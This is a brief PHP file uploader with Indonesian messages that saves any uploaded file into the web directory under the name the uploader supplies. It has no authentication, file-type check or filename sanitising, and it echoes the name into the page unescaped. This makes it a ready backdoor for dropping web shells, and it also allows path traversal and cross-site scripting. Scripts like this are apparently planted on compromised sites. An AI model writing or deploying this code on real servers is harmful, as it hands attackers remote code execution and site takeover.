<?php
if (isset($_FILES['file'])) {
    if (move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo " Upload sukses: <a href='" . $_FILES['file']['name'] . "'>" . $_FILES['file']['name'] . "</a><br><br>";
    } else {
        echo " Upload gagal.<br><br>";
    }
}

echo '<form method="POST" enctype="multipart/form-data" action="">
<input type="file" name="file">
<input type="submit" value="Upload">
</form>';
?>
